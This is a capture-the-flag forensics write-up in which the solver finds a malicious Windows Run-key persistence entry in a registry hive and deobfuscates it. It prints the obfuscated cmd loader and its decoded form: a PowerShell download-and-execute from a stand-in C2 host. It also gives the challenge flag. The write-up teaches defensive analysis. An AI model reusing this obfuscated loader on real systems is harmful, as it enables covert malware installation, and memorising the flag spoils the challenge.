# EnduranceRun

### Description:
* A bunch of phishing emails have been giving us a run and slipping past our defenses lately, and now the CEO says his machine is acting weird. We told him to just reboot, but he says that isn't fixing it. Here's a copy of the NTUSER.dat file from his machine. Take a look and see what you can find.

### Objective:
* Find the malicious registry key in the given hive.

### Difficulty:
* Easy

### Flag:
* `HTB{rUn_Run_ruN_k3y_iS_a1w@ys_4_g0oD_plac3_2_l00k}`

### Release:
* [forensics_endurance_run.zip](release/forensics_endurance_run.zip)

### Challenge:

The given file is a Windows registry file:

```
$ file NTUSER.DAT 
NTUSER.DAT: MS Windows registry file, NT/2000 or above
```

A really common place to look for malware persistence is the run key (hence the "run" hints in the name and the prompt). A tool like `reglookup` (`apt install reglookup`) will show the malicious key on Linux:

```
$ reglookup -p '/Software/Microsoft/Windows/CurrentVersion/Run' NTUSER.DAT 
PATH,TYPE,VALUE,MTIME
/SOFTWARE/Microsoft/Windows/CurrentVersion/Run,KEY,,2021-02-04 19:52:29
/SOFTWARE/Microsoft/Windows/CurrentVersion/Run/OneDrive,SZ,%22C:\Users\dayron\AppData\Local\Microsoft\OneDrive\OneDrive.exe%22 /background,
/SOFTWARE/Microsoft/Windows/CurrentVersion/Run/update,SZ,%25TEMP:~-8%2C1%25md /C%22set ltS=S_a1w@&&set AQ8f=le %25TE&&set nP=%25/a.exe&&set W5vl=00k};&&set azS=k3y_i&&set Nime=ys&&set ei=shell&&set CJO=power&&set qg=_4_g0o&&set qh7P=MP&&set txfY=%25TEMP%25/a.exe&&set iQ= -c 'wget http://mal&&set rZM=icious.c2.h&&set SlZ= &&set 0PU='; SET flag=HTB{rUn_Run_ruN_&&set eoOa=D_plac3_2_l&&set R3=tb/stage2 -outfi&&call set
xg=%25CJO%25%25ei%25%25iQ%25%25rZM%25%25R3%25%25AQ8f%25%25qh7P%25%25nP%25%250PU%25%25azS%25%25ltS%25%25Nime%25%25qg%25%25eoOa%25%25W5vl%25%25SlZ%25%25txfY%25&&call echo %25xg%25%22|cmd,
```

There are many tools that can provide this data ([here's](https://answers.microsoft.com/en-us/windows/forum/windows_7-desktop/how-to-view-ntuserdat-file-like-in-registry/24a91ae2-e1af-48e4-8d53-50ae291716db) a good list).

The last key is clearly obfuscated and therefore suspicious. I'll also note the `flag` variable is being set to something that starts with "HTB{", but I don't see all of it.

Some of the output is URL encoded. I'll drop it into Burp Decoder or Cyberchef to get:

```
%TEMP:~-8,1%md /C"set ltS=S_a1w@&&set AQ8f=le %TE&&set nP=%/a.exe&&set W5vl=00k};&&set azS=k3y_i&&set Nime=ys&&set ei=shell&&set CJO=power&&set qg=_4_g0o&&set qh7P=MP&&set txfY=%TEMP%/a.exe&&set iQ= -c 'wget http://mal&&set rZM=icious.c2.h&&set SlZ= &&set 0PU='; SET flag={rUn_Run_ruN_&&set eoOa=D_plac3_2_l&&set R3=tb/stage2 -outfi&&call set xg=%CJO%%ei%%iQ%%rZM%%R3%%AQ8f%%qh7P%%nP%%0PU%%azS%%ltS%%Nime%%qg%%eoOa%%W5vl%%SlZ%%txfY%&&call echo %xg%"|cmd
```

`%TEMP:~-8,1%md` is just using the -8th character from the `%TEMP%` env variable to get a `c` to make `cmd`. `/C` is the argument to run the string that follows as a command. It just uses a ton of `set` commands to set variables, and then combines them at the end.

I can turn the rest into Python to see how it's combined:

```python
#!/usr/bin/env python3

ltS = "S_a1w@"
AQ8f = "le %TE"
nP = "%/a.exe"
W5vl = "00k};"
azS = "k3y_i"
Nime = "ys"
ei = "shell"
CJO = "power"
qg = "_4_g0o"
qh7P = "MP"
txfY = "%TEMP%/a.exe"
iQ = " -c 'wget http://mal"
rZM = "icious.c2.h"
SlZ = " "
_0PU = "'; SET flag=HTB{rUn_Run_ruN_"
eoOa = "D_plac3_2_l"
R3 = "tb/stage2 -outfi"
xg = f'{CJO}{ei}{iQ}{rZM}{R3}{AQ8f}{qh7P}{nP}{_0PU}{azS}{ltS}{Nime}{qg}{eoOa}{W5vl}{SlZ}{txfY}'
print(xg)
```

Running it shows the deobfuscated code:

```
$ python3 solve.py 
powershell -c 'wget http://malicious.c2.htb/stage2 -outfile %TEMP%/a.exe'; SET flag={rUn_Run_ruN_k3y_iS_a1w@ys_4_g0oD_plac3_2_l00k}; %TEMP%/a.exe
```

Or this could just be reassembled manually. Either way, there's the flag.
